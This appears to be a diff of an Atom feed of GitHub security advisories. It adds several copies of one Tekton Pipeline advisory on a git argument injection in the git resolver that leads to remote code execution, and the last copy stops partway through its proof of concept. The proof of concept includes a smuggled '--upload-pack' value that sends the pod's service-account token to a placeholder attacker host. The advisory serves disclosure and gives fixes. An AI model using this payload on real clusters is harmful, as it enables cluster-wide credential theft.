@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-05-21T22:26:35.198Z</updated>
+    <updated>2026-05-21T23:19:51.424Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,591 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/tektoncd/pipeline] Tekton Pipeline: Git Resolver Unsanitized Revision Parameter Enables git Argument Injection Leading to RCE]]></title>
+        <id>https://github.com/advisories/GHSA-94jr-7pqp-xhcq</id>
+        <link href="https://github.com/advisories/GHSA-94jr-7pqp-xhcq"/>
+        <updated>2026-05-21T22:41:28.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The git resolver's <code>revision</code> parameter is passed directly as a positional argument to <code>git fetch</code> without any validation that it does not begin with a <code>-</code> character. Because git parses flags from mixed positional arguments, an attacker can inject arbitrary <code>git fetch</code> flags such as <code>--upload-pack=&lt;binary&gt;</code>. Combined with the <code>validateRepoURL</code> function explicitly permitting URLs that begin with <code>/</code> (local filesystem paths), a tenant who can submit <code>ResolutionRequest</code> objects can chain these two behaviors to execute an arbitrary binary on the resolver pod. The <code>tekton-pipelines-resolvers</code> ServiceAccount holds cluster-wide <code>get/list/watch</code> on all Secrets, so code execution on the resolver pod enables full cluster-wide secret exfiltration.</p>
+<h2 id="details">Details</h2>
+<h3 id="root-cause-1--unvalidated-revision-parameter-passed-to-git-fetch">Root Cause 1 — Unvalidated <code>revision</code> parameter passed to <code>git fetch</code></h3>
+<p><code>pkg/resolution/resolver/git/repository.go:85</code>:</p>
+<pre><code class="language-go">// pkg/resolution/resolver/git/repository.go lines 84-96
+// 'revision' is the raw user-supplied string from the ResolutionRequest param.
+// It is passed verbatim as a positional argument to git fetch:
+func (repo *repository) checkout(ctx context.Context, revision string) error {
+    _, err := repo.execGit(ctx, "fetch", "origin", revision, "--depth=1")
+    // When revision == "--upload-pack=/usr/bin/curl", git parses it as the
+    // --upload-pack flag, not as a refspec — executing the binary locally.
+    if err != nil {
+        return fmt.Errorf("fetch: %w", err)
+    }
+    _, err = repo.execGit(ctx, "checkout", "FETCH_HEAD")
+    return err
+}
+</code></pre>
+<p><code>execGit</code> invokes <code>exec.CommandContext("git", ...)</code> — no shell is used, so shell metacharacters cannot be injected. However, git itself parses flags from mixed positional arguments. When <code>revision = "--upload-pack=/path/to/binary"</code>, git receives this as the flag <code>--upload-pack=/path/to/binary</code>, not as a refspec. <code>PopulateDefaultParams</code> (<code>resolver.go:418–424</code>) applies only a leading-slash strip and a <code>containsDotDot</code> check on the <code>pathInRepo</code> parameter; the <code>revision</code> parameter receives no validation at all.</p>
+<h3 id="root-cause-2--validaterepourl-explicitly-permits-local-filesystem-paths">Root Cause 2 — <code>validateRepoURL</code> explicitly permits local filesystem paths</h3>
+<p><code>pkg/resolution/resolver/git/resolver.go:154-158</code>:</p>
+<pre><code class="language-go">// validateRepoURL validates if the given URL is a valid git, http, https URL or
+// starting with a / (a local repository).
+func validateRepoURL(url string) bool {
+    pattern := `^(/|[^@]+@[^:]+|(git|https?)://)`
+    re := regexp.MustCompile(pattern)
+    return re.MatchString(url)
+}
+</code></pre>
+<p>Any URL beginning with <code>/</code> passes validation and is used directly as the argument to <code>git clone</code>. This means a local filesystem path such as <code>/tmp/some-repo</code> is a valid resolver URL.</p>
+<h3 id="exploit-chain">Exploit Chain</h3>
+<p><code>--upload-pack=&lt;binary&gt;</code> causes git to execute the specified binary as the upload-pack server when communicating with the remote. For local-path remotes (<code>/path</code>), git invokes the binary on the resolver pod itself with the repository path as its sole argument. Because the argument is passed via <code>exec.Command</code> as a single <code>--upload-pack=&lt;binary&gt;</code> string (not split by a shell), only binaries at known paths can be invoked — but several useful binaries exist in the resolver pod image (e.g., <code>/bin/sh</code>, <code>/usr/bin/curl</code>, <code>/bin/cp</code>).</p>
+<p>Attack complexity is High because the exploit requires either:</p>
+<ul>
+<li>A valid git repository at a known, predicable path on the resolver pod (e.g., <code>/tmp/&lt;reponame&gt;-&lt;suffix&gt;</code> from a concurrent resolution), or</li>
+<li>A default-URL configuration pointing at a local path</li>
+</ul>
+<h2 id="poc">PoC</h2>
+<pre><code class="language-bash"># Step 1: Set up a local git repository to serve as the "origin"
+# (in a real attack, the attacker would time this against a concurrent clone
+# or use any pre-existing git repo path on the resolver pod)
+git init /tmp/localrepo &amp;&amp; cd /tmp/localrepo &amp;&amp; git commit --allow-empty -m "init"
+
+# Step 2: Craft a ResolutionRequest with injected --upload-pack flag
+kubectl create -f - &lt;&lt;'EOF'
+apiVersion: resolution.tekton.dev/v1beta1
+kind: ResolutionRequest
+metadata:
+  name: revision-injection-poc
+  namespace: default
+  labels:
+    resolution.tekton.dev/type: git
+spec:
+  params:
+    - name: url
+      value: /tmp/localrepo
+    - name: revision
+      value: "--upload-pack=/usr/bin/curl http://c2.attacker.internal/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token | base64 -w0)"
+    - name: pathInRepo
+      value: README.md
+EOF
+
+# The resolver pod executes:
+# git -C &lt;tmpdir&gt; fetch origin \
+#   "--upload-pack=/usr/bin/curl http://c2.attacker.internal/..." \
+#   --depth=1
+#
+# For single-argument binaries (/bin/sh, /usr/bin/env, etc.):
+# git -C &lt;tmpdir&gt; fetch origin "--upload-pack=/bin/sh" --depth=1
+# Executes /bin/sh with the local repository path as argv[1].
+# From /bin/sh, the attacker can use a pre-staged script (e.g., written
+# via a workspace volume) to achieve arbitrary command execution.
+</code></pre>
+<p><strong>Verified</strong>: <code>git fetch origin --upload-pack=/tmp/test-exec.sh --depth=1</code> executes <code>test-exec.sh</code> on the local machine even when <code>origin</code> is a local filesystem path. Exit code 0 was observed with the test binary executed successfully.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Code execution on the resolver pod</strong> when an attacker can stage or predict a valid git repository path in <code>/tmp</code> on the resolver pod.</li>
+<li><strong>Full cluster-wide Secret exfiltration</strong>: The <code>tekton-pipelines-resolvers</code> ServiceAccount is bound to a ClusterRole that grants <code>get/list/watch</code> on all Secrets in all namespaces (<code>config/resolvers/200-clusterrole.yaml</code>). Code execution on the resolver pod is therefore equivalent to reading every Secret in the cluster.</li>
+<li><strong>Privilege escalation</strong>: Secrets typically include kubeconfig files, cloud provider credentials, and API tokens — reading them enables lateral movement to cloud infrastructure.</li>
+<li>Both the deprecated resolver (<code>pkg/resolution/resolver/git/</code>) and the current resolver (<code>pkg/remoteresolution/resolver/git/</code>) share the same <code>validateRepoURL</code>, <code>PopulateDefaultParams</code>, and <code>checkout</code> implementation via the shared <code>git</code> package. Both are affected.</li>
+</ul>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p><strong>Fix 1 — Validate that <code>revision</code> does not begin with <code>-</code></strong> in <code>PopulateDefaultParams</code>:</p>
+<pre><code class="language-go">if strings.HasPrefix(paramsMap[RevisionParam], "-") {
+    return nil, fmt.Errorf("invalid revision %q: must not begin with '-'", paramsMap[RevisionParam])
+}
+</code></pre>
+<p><strong>Fix 2 — Restrict <code>validateRepoURL</code> to remote URLs only</strong> (remove local-path support in production builds, or add an explicit admin opt-in feature flag):</p>
+<pre><code class="language-go">func validateRepoURL(url string) bool {
+    pattern := `^([^@]+@[^:]+|(git|https?)://)`
+    re := regexp.MustCompile(pattern)
+    return re.MatchString(url)
+}
+</code></pre>
+<p>Applying Fix 1 alone is sufficient to prevent the argument injection. Fix 2 eliminates the enabling condition (local-path remotes for which <code>--upload-pack</code> runs locally) and reduces attack surface further.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/tektoncd/pipeline/security/advisories/GHSA-94jr-7pqp-xhcq">https://github.com/tektoncd/pipeline/security/advisories/GHSA-94jr-7pqp-xhcq</a></li>
+<li><a href="https://github.com/tektoncd/pipeline/releases/tag/v1.11.1">https://github.com/tektoncd/pipeline/releases/tag/v1.11.1</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40938">https://nvd.nist.gov/vuln/detail/CVE-2026-40938</a></li>
+<li><a href="https://github.com/advisories/GHSA-94jr-7pqp-xhcq">https://github.com/advisories/GHSA-94jr-7pqp-xhcq</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-94jr-7pqp-xhcq</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-21T20:28:36.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/tektoncd/pipeline] Tekton Pipeline: Git Resolver Unsanitized Revision Parameter Enables git Argument Injection Leading to RCE]]></title>
+        <id>https://github.com/advisories/GHSA-94jr-7pqp-xhcq</id>
+        <link href="https://github.com/advisories/GHSA-94jr-7pqp-xhcq"/>
+        <updated>2026-05-21T22:41:28.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The git resolver's <code>revision</code> parameter is passed directly as a positional argument to <code>git fetch</code> without any validation that it does not begin with a <code>-</code> character. Because git parses flags from mixed positional arguments, an attacker can inject arbitrary <code>git fetch</code> flags such as <code>--upload-pack=&lt;binary&gt;</code>. Combined with the <code>validateRepoURL</code> function explicitly permitting URLs that begin with <code>/</code> (local filesystem paths), a tenant who can submit <code>ResolutionRequest</code> objects can chain these two behaviors to execute an arbitrary binary on the resolver pod. The <code>tekton-pipelines-resolvers</code> ServiceAccount holds cluster-wide <code>get/list/watch</code> on all Secrets, so code execution on the resolver pod enables full cluster-wide secret exfiltration.</p>
+<h2 id="details">Details</h2>
+<h3 id="root-cause-1--unvalidated-revision-parameter-passed-to-git-fetch">Root Cause 1 — Unvalidated <code>revision</code> parameter passed to <code>git fetch</code></h3>
+<p><code>pkg/resolution/resolver/git/repository.go:85</code>:</p>
+<pre><code class="language-go">// pkg/resolution/resolver/git/repository.go lines 84-96
+// 'revision' is the raw user-supplied string from the ResolutionRequest param.
+// It is passed verbatim as a positional argument to git fetch:
+func (repo *repository) checkout(ctx context.Context, revision string) error {
+    _, err := repo.execGit(ctx, "fetch", "origin", revision, "--depth=1")
+    // When revision == "--upload-pack=/usr/bin/curl", git parses it as the
+    // --upload-pack flag, not as a refspec — executing the binary locally.
+    if err != nil {
+        return fmt.Errorf("fetch: %w", err)
+    }
+    _, err = repo.execGit(ctx, "checkout", "FETCH_HEAD")
+    return err
+}
+</code></pre>
+<p><code>execGit</code> invokes <code>exec.CommandContext("git", ...)</code> — no shell is used, so shell metacharacters cannot be injected. However, git itself parses flags from mixed positional arguments. When <code>revision = "--upload-pack=/path/to/binary"</code>, git receives this as the flag <code>--upload-pack=/path/to/binary</code>, not as a refspec. <code>PopulateDefaultParams</code> (<code>resolver.go:418–424</code>) applies only a leading-slash strip and a <code>containsDotDot</code> check on the <code>pathInRepo</code> parameter; the <code>revision</code> parameter receives no validation at all.</p>
+<h3 id="root-cause-2--validaterepourl-explicitly-permits-local-filesystem-paths">Root Cause 2 — <code>validateRepoURL</code> explicitly permits local filesystem paths</h3>
+<p><code>pkg/resolution/resolver/git/resolver.go:154-158</code>:</p>
+<pre><code class="language-go">// validateRepoURL validates if the given URL is a valid git, http, https URL or
+// starting with a / (a local repository).
+func validateRepoURL(url string) bool {
+    pattern := `^(/|[^@]+@[^:]+|(git|https?)://)`
+    re := regexp.MustCompile(pattern)
+    return re.MatchString(url)
+}
+</code></pre>
+<p>Any URL beginning with <code>/</code> passes validation and is used directly as the argument to <code>git clone</code>. This means a local filesystem path such as <code>/tmp/some-repo</code> is a valid resolver URL.</p>
+<h3 id="exploit-chain">Exploit Chain</h3>
+<p><code>--upload-pack=&lt;binary&gt;</code> causes git to execute the specified binary as the upload-pack server when communicating with the remote. For local-path remotes (<code>/path</code>), git invokes the binary on the resolver pod itself with the repository path as its sole argument. Because the argument is passed via <code>exec.Command</code> as a single <code>--upload-pack=&lt;binary&gt;</code> string (not split by a shell), only binaries at known paths can be invoked — but several useful binaries exist in the resolver pod image (e.g., <code>/bin/sh</code>, <code>/usr/bin/curl</code>, <code>/bin/cp</code>).</p>
+<p>Attack complexity is High because the exploit requires either:</p>
+<ul>
+<li>A valid git repository at a known, predicable path on the resolver pod (e.g., <code>/tmp/&lt;reponame&gt;-&lt;suffix&gt;</code> from a concurrent resolution), or</li>
+<li>A default-URL configuration pointing at a local path</li>
+</ul>
+<h2 id="poc">PoC</h2>
+<pre><code class="language-bash"># Step 1: Set up a local git repository to serve as the "origin"
+# (in a real attack, the attacker would time this against a concurrent clone
+# or use any pre-existing git repo path on the resolver pod)
+git init /tmp/localrepo &amp;&amp; cd /tmp/localrepo &amp;&amp; git commit --allow-empty -m "init"
+
+# Step 2: Craft a ResolutionRequest with injected --upload-pack flag
+kubectl create -f - &lt;&lt;'EOF'
+apiVersion: resolution.tekton.dev/v1beta1
+kind: ResolutionRequest
+metadata:
+  name: revision-injection-poc
+  namespace: default
+  labels:
+    resolution.tekton.dev/type: git
+spec:
+  params:
+    - name: url
+      value: /tmp/localrepo
+    - name: revision
+      value: "--upload-pack=/usr/bin/curl http://c2.attacker.internal/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token | base64 -w0)"
+    - name: pathInRepo
+      value: README.md
+EOF
+
+# The resolver pod executes:
+# git -C &lt;tmpdir&gt; fetch origin \
+#   "--upload-pack=/usr/bin/curl http://c2.attacker.internal/..." \
+#   --depth=1
+#
+# For single-argument binaries (/bin/sh, /usr/bin/env, etc.):
+# git -C &lt;tmpdir&gt; fetch origin "--upload-pack=/bin/sh" --depth=1
+# Executes /bin/sh with the local repository path as argv[1].
+# From /bin/sh, the attacker can use a pre-staged script (e.g., written
+# via a workspace volume) to achieve arbitrary command execution.
+</code></pre>
+<p><strong>Verified</strong>: <code>git fetch origin --upload-pack=/tmp/test-exec.sh --depth=1</code> executes <code>test-exec.sh</code> on the local machine even when <code>origin</code> is a local filesystem path. Exit code 0 was observed with the test binary executed successfully.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Code execution on the resolver pod</strong> when an attacker can stage or predict a valid git repository path in <code>/tmp</code> on the resolver pod.</li>
+<li><strong>Full cluster-wide Secret exfiltration</strong>: The <code>tekton-pipelines-resolvers</code> ServiceAccount is bound to a ClusterRole that grants <code>get/list/watch</code> on all Secrets in all namespaces (<code>config/resolvers/200-clusterrole.yaml</code>). Code execution on the resolver pod is therefore equivalent to reading every Secret in the cluster.</li>
+<li><strong>Privilege escalation</strong>: Secrets typically include kubeconfig files, cloud provider credentials, and API tokens — reading them enables lateral movement to cloud infrastructure.</li>
+<li>Both the deprecated resolver (<code>pkg/resolution/resolver/git/</code>) and the current resolver (<code>pkg/remoteresolution/resolver/git/</code>) share the same <code>validateRepoURL</code>, <code>PopulateDefaultParams</code>, and <code>checkout</code> implementation via the shared <code>git</code> package. Both are affected.</li>
+</ul>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p><strong>Fix 1 — Validate that <code>revision</code> does not begin with <code>-</code></strong> in <code>PopulateDefaultParams</code>:</p>
+<pre><code class="language-go">if strings.HasPrefix(paramsMap[RevisionParam], "-") {
+    return nil, fmt.Errorf("invalid revision %q: must not begin with '-'", paramsMap[RevisionParam])
+}
+</code></pre>
+<p><strong>Fix 2 — Restrict <code>validateRepoURL</code> to remote URLs only</strong> (remove local-path support in production builds, or add an explicit admin opt-in feature flag):</p>
+<pre><code class="language-go">func validateRepoURL(url string) bool {
+    pattern := `^([^@]+@[^:]+|(git|https?)://)`
+    re := regexp.MustCompile(pattern)
+    return re.MatchString(url)
+}
+</code></pre>
+<p>Applying Fix 1 alone is sufficient to prevent the argument injection. Fix 2 eliminates the enabling condition (local-path remotes for which <code>--upload-pack</code> runs locally) and reduces attack surface further.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/tektoncd/pipeline/security/advisories/GHSA-94jr-7pqp-xhcq">https://github.com/tektoncd/pipeline/security/advisories/GHSA-94jr-7pqp-xhcq</a></li>
+<li><a href="https://github.com/tektoncd/pipeline/releases/tag/v1.11.1">https://github.com/tektoncd/pipeline/releases/tag/v1.11.1</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40938">https://nvd.nist.gov/vuln/detail/CVE-2026-40938</a></li>
+<li><a href="https://github.com/advisories/GHSA-94jr-7pqp-xhcq">https://github.com/advisories/GHSA-94jr-7pqp-xhcq</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-94jr-7pqp-xhcq</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-21T20:28:36.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/tektoncd/pipeline] Tekton Pipeline: Git Resolver Unsanitized Revision Parameter Enables git Argument Injection Leading to RCE]]></title>
+        <id>https://github.com/advisories/GHSA-94jr-7pqp-xhcq</id>
+        <link href="https://github.com/advisories/GHSA-94jr-7pqp-xhcq"/>
+        <updated>2026-05-21T22:41:28.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The git resolver's <code>revision</code> parameter is passed directly as a positional argument to <code>git fetch</code> without any validation that it does not begin with a <code>-</code> character. Because git parses flags from mixed positional arguments, an attacker can inject arbitrary <code>git fetch</code> flags such as <code>--upload-pack=&lt;binary&gt;</code>. Combined with the <code>validateRepoURL</code> function explicitly permitting URLs that begin with <code>/</code> (local filesystem paths), a tenant who can submit <code>ResolutionRequest</code> objects can chain these two behaviors to execute an arbitrary binary on the resolver pod. The <code>tekton-pipelines-resolvers</code> ServiceAccount holds cluster-wide <code>get/list/watch</code> on all Secrets, so code execution on the resolver pod enables full cluster-wide secret exfiltration.</p>
+<h2 id="details">Details</h2>
+<h3 id="root-cause-1--unvalidated-revision-parameter-passed-to-git-fetch">Root Cause 1 — Unvalidated <code>revision</code> parameter passed to <code>git fetch</code></h3>
+<p><code>pkg/resolution/resolver/git/repository.go:85</code>:</p>
+<pre><code class="language-go">// pkg/resolution/resolver/git/repository.go lines 84-96
+// 'revision' is the raw user-supplied string from the ResolutionRequest param.
+// It is passed verbatim as a positional argument to git fetch:
+func (repo *repository) checkout(ctx context.Context, revision string) error {
+    _, err := repo.execGit(ctx, "fetch", "origin", revision, "--depth=1")
+    // When revision == "--upload-pack=/usr/bin/curl", git parses it as the
+    // --upload-pack flag, not as a refspec — executing the binary locally.
+    if err != nil {
+        return fmt.Errorf("fetch: %w", err)
+    }
+    _, err = repo.execGit(ctx, "checkout", "FETCH_HEAD")
+    return err
+}
+</code></pre>
+<p><code>execGit</code> invokes <code>exec.CommandContext("git", ...)</code> — no shell is used, so shell metacharacters cannot be injected. However, git itself parses flags from mixed positional arguments. When <code>revision = "--upload-pack=/path/to/binary"</code>, git receives this as the flag <code>--upload-pack=/path/to/binary</code>, not as a refspec. <code>PopulateDefaultParams</code> (<code>resolver.go:418–424</code>) applies only a leading-slash strip and a <code>containsDotDot</code> check on the <code>pathInRepo</code> parameter; the <code>revision</code> parameter receives no validation at all.</p>
+<h3 id="root-cause-2--validaterepourl-explicitly-permits-local-filesystem-paths">Root Cause 2 — <code>validateRepoURL</code> explicitly permits local filesystem paths</h3>
+<p><code>pkg/resolution/resolver/git/resolver.go:154-158</code>:</p>
+<pre><code class="language-go">// validateRepoURL validates if the given URL is a valid git, http, https URL or
+// starting with a / (a local repository).
+func validateRepoURL(url string) bool {
+    pattern := `^(/|[^@]+@[^:]+|(git|https?)://)`
+    re := regexp.MustCompile(pattern)
+    return re.MatchString(url)
+}
+</code></pre>
+<p>Any URL beginning with <code>/</code> passes validation and is used directly as the argument to <code>git clone</code>. This means a local filesystem path such as <code>/tmp/some-repo</code> is a valid resolver URL.</p>
+<h3 id="exploit-chain">Exploit Chain</h3>
+<p><code>--upload-pack=&lt;binary&gt;</code> causes git to execute the specified binary as the upload-pack server when communicating with the remote. For local-path remotes (<code>/path</code>), git invokes the binary on the resolver pod itself with the repository path as its sole argument. Because the argument is passed via <code>exec.Command</code> as a single <code>--upload-pack=&lt;binary&gt;</code> string (not split by a shell), only binaries at known paths can be invoked — but several useful binaries exist in the resolver pod image (e.g., <code>/bin/sh</code>, <code>/usr/bin/curl</code>, <code>/bin/cp</code>).</p>
+<p>Attack complexity is High because the exploit requires either:</p>
+<ul>
+<li>A valid git repository at a known, predicable path on the resolver pod (e.g., <code>/tmp/&lt;reponame&gt;-&lt;suffix&gt;</code> from a concurrent resolution), or</li>
+<li>A default-URL configuration pointing at a local path</li>
+</ul>
+<h2 id="poc">PoC</h2>
+<pre><code class="language-bash"># Step 1: Set up a local git repository to serve as the "origin"
+# (in a real attack, the attacker would time this against a concurrent clone
+# or use any pre-existing git repo path on the resolver pod)
+git init /tmp/localrepo &amp;&amp; cd /tmp/localrepo &amp;&amp; git commit --allow-empty -m "init"
+
+# Step 2: Craft a ResolutionRequest with injected --upload-pack flag
+kubectl create -f - &lt;&lt;'EOF'
+apiVersion: resolution.tekton.dev/v1beta1
+kind: ResolutionRequest
+metadata:
+  name: revision-injection-poc
+  namespace: default
+  labels:
+    resolution.tekton.dev/type: git
+spec:
+  params:
+    - name: url
+      value: /tmp/localrepo
+    - name: revision
+      value: "--upload-pack=/usr/bin/curl http://c2.attacker.internal/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token | base64 -w0)"
+    - name: pathInRepo
+      value: README.md
+EOF
+
+# The resolver pod executes:
+# git -C &lt;tmpdir&gt; fetch origin \
+#   "--upload-pack=/usr/bin/curl http://c2.attacker.internal/..." \
+#   --depth=1
+#
+# For single-argument binaries (/bin/sh, /usr/bin/env, etc.):
+# git -C &lt;tmpdir&gt; fetch origin "--upload-pack=/bin/sh" --depth=1
+# Executes /bin/sh with the local repository path as argv[1].
+# From /bin/sh, the attacker can use a pre-staged script (e.g., written
+# via a workspace volume) to achieve arbitrary command execution.
+</code></pre>
+<p><strong>Verified</strong>: <code>git fetch origin --upload-pack=/tmp/test-exec.sh --depth=1</code> executes <code>test-exec.sh</code> on the local machine even when <code>origin</code> is a local filesystem path. Exit code 0 was observed with the test binary executed successfully.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Code execution on the resolver pod</strong> when an attacker can stage or predict a valid git repository path in <code>/tmp</code> on the resolver pod.</li>
+<li><strong>Full cluster-wide Secret exfiltration</strong>: The <code>tekton-pipelines-resolvers</code> ServiceAccount is bound to a ClusterRole that grants <code>get/list/watch</code> on all Secrets in all namespaces (<code>config/resolvers/200-clusterrole.yaml</code>). Code execution on the resolver pod is therefore equivalent to reading every Secret in the cluster.</li>
+<li><strong>Privilege escalation</strong>: Secrets typically include kubeconfig files, cloud provider credentials, and API tokens — reading them enables lateral movement to cloud infrastructure.</li>
+<li>Both the deprecated resolver (<code>pkg/resolution/resolver/git/</code>) and the current resolver (<code>pkg/remoteresolution/resolver/git/</code>) share the same <code>validateRepoURL</code>, <code>PopulateDefaultParams</code>, and <code>checkout</code> implementation via the shared <code>git</code> package. Both are affected.</li>
+</ul>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p><strong>Fix 1 — Validate that <code>revision</code> does not begin with <code>-</code></strong> in <code>PopulateDefaultParams</code>:</p>
+<pre><code class="language-go">if strings.HasPrefix(paramsMap[RevisionParam], "-") {
+    return nil, fmt.Errorf("invalid revision %q: must not begin with '-'", paramsMap[RevisionParam])
+}
+</code></pre>
+<p><strong>Fix 2 — Restrict <code>validateRepoURL</code> to remote URLs only</strong> (remove local-path support in production builds, or add an explicit admin opt-in feature flag):</p>
+<pre><code class="language-go">func validateRepoURL(url string) bool {
+    pattern := `^([^@]+@[^:]+|(git|https?)://)`
+    re := regexp.MustCompile(pattern)
+    return re.MatchString(url)
+}
+</code></pre>
+<p>Applying Fix 1 alone is sufficient to prevent the argument injection. Fix 2 eliminates the enabling condition (local-path remotes for which <code>--upload-pack</code> runs locally) and reduces attack surface further.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/tektoncd/pipeline/security/advisories/GHSA-94jr-7pqp-xhcq">https://github.com/tektoncd/pipeline/security/advisories/GHSA-94jr-7pqp-xhcq</a></li>
+<li><a href="https://github.com/tektoncd/pipeline/releases/tag/v1.11.1">https://github.com/tektoncd/pipeline/releases/tag/v1.11.1</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40938">https://nvd.nist.gov/vuln/detail/CVE-2026-40938</a></li>
+<li><a href="https://github.com/advisories/GHSA-94jr-7pqp-xhcq">https://github.com/advisories/GHSA-94jr-7pqp-xhcq</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-94jr-7pqp-xhcq</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-21T20:28:36.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/tektoncd/pipeline] Tekton Pipeline: Git Resolver Unsanitized Revision Parameter Enables git Argument Injection Leading to RCE]]></title>
+        <id>https://github.com/advisories/GHSA-94jr-7pqp-xhcq</id>
+        <link href="https://github.com/advisories/GHSA-94jr-7pqp-xhcq"/>
+        <updated>2026-05-21T22:41:28.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The git resolver's <code>revision</code> parameter is passed directly as a positional argument to <code>git fetch</code> without any validation that it does not begin with a <code>-</code> character. Because git parses flags from mixed positional arguments, an attacker can inject arbitrary <code>git fetch</code> flags such as <code>--upload-pack=&lt;binary&gt;</code>. Combined with the <code>validateRepoURL</code> function explicitly permitting URLs that begin with <code>/</code> (local filesystem paths), a tenant who can submit <code>ResolutionRequest</code> objects can chain these two behaviors to execute an arbitrary binary on the resolver pod. The <code>tekton-pipelines-resolvers</code> ServiceAccount holds cluster-wide <code>get/list/watch</code> on all Secrets, so code execution on the resolver pod enables full cluster-wide secret exfiltration.</p>
+<h2 id="details">Details</h2>
+<h3 id="root-cause-1--unvalidated-revision-parameter-passed-to-git-fetch">Root Cause 1 — Unvalidated <code>revision</code> parameter passed to <code>git fetch</code></h3>
+<p><code>pkg/resolution/resolver/git/repository.go:85</code>:</p>
+<pre><code class="language-go">// pkg/resolution/resolver/git/repository.go lines 84-96
+// 'revision' is the raw user-supplied string from the ResolutionRequest param.
+// It is passed verbatim as a positional argument to git fetch:
+func (repo *repository) checkout(ctx context.Context, revision string) error {
+    _, err := repo.execGit(ctx, "fetch", "origin", revision, "--depth=1")
+    // When revision == "--upload-pack=/usr/bin/curl", git parses it as the
+    // --upload-pack flag, not as a refspec — executing the binary locally.
+    if err != nil {
+        return fmt.Errorf("fetch: %w", err)
+    }
+    _, err = repo.execGit(ctx, "checkout", "FETCH_HEAD")
+    return err
+}
+</code></pre>
+<p><code>execGit</code> invokes <code>exec.CommandContext("git", ...)</code> — no shell is used, so shell metacharacters cannot be injected. However, git itself parses flags from mixed positional arguments. When <code>revision = "--upload-pack=/path/to/binary"</code>, git receives this as the flag <code>--upload-pack=/path/to/binary</code>, not as a refspec. <code>PopulateDefaultParams</code> (<code>resolver.go:418–424</code>) applies only a leading-slash strip and a <code>containsDotDot</code> check on the <code>pathInRepo</code> parameter; the <code>revision</code> parameter receives no validation at all.</p>
+<h3 id="root-cause-2--validaterepourl-explicitly-permits-local-filesystem-paths">Root Cause 2 — <code>validateRepoURL</code> explicitly permits local filesystem paths</h3>
+<p><code>pkg/resolution/resolver/git/resolver.go:154-158</code>:</p>
+<pre><code class="language-go">// validateRepoURL validates if the given URL is a valid git, http, https URL or
+// starting with a / (a local repository).
+func validateRepoURL(url string) bool {
+    pattern := `^(/|[^@]+@[^:]+|(git|https?)://)`
+    re := regexp.MustCompile(pattern)
+    return re.MatchString(url)
+}
+</code></pre>
+<p>Any URL beginning with <code>/</code> passes validation and is used directly as the argument to <code>git clone</code>. This means a local filesystem path such as <code>/tmp/some-repo</code> is a valid resolver URL.</p>
+<h3 id="exploit-chain">Exploit Chain</h3>
+<p><code>--upload-pack=&lt;binary&gt;</code> causes git to execute the specified binary as the upload-pack server when communicating with the remote. For local-path remotes (<code>/path</code>), git invokes the binary on the resolver pod itself with the repository path as its sole argument. Because the argument is passed via <code>exec.Command</code> as a single <code>--upload-pack=&lt;binary&gt;</code> string (not split by a shell), only binaries at known paths can be invoked — but several useful binaries exist in the resolver pod image (e.g., <code>/bin/sh</code>, <code>/usr/bin/curl</code>, <code>/bin/cp</code>).</p>
+<p>Attack complexity is High because the exploit requires either:</p>
+<ul>
+<li>A valid git repository at a known, predicable path on the resolver pod (e.g., <code>/tmp/&lt;reponame&gt;-&lt;suffix&gt;</code> from a concurrent resolution), or</li>
+<li>A default-URL configuration pointing at a local path</li>
+</ul>
+<h2 id="poc">PoC</h2>
+<pre><code class="language-bash"># Step 1: Set up a local git repository to serve as the "origin"
+# (in a real attack, the attacker would time this against a concurrent clone
+# or use any pre-existing git repo path on the resolver pod)
+git init /tmp/localrepo &amp;&amp; cd /tmp/localrepo &amp;&amp; git commit --allow-empty -m "init"
+
+# Step 2: Craft a ResolutionRequest with injected --upload-pack flag
+kubectl create -f - &lt;&lt;'EOF'
+apiVersion: resolution.tekton.dev/v1beta1
+kind: ResolutionRequest
+metadata:
+  name: revision-injection-poc
+  namespace: default
+  labels:
+    resolution.tekton.dev/type: git
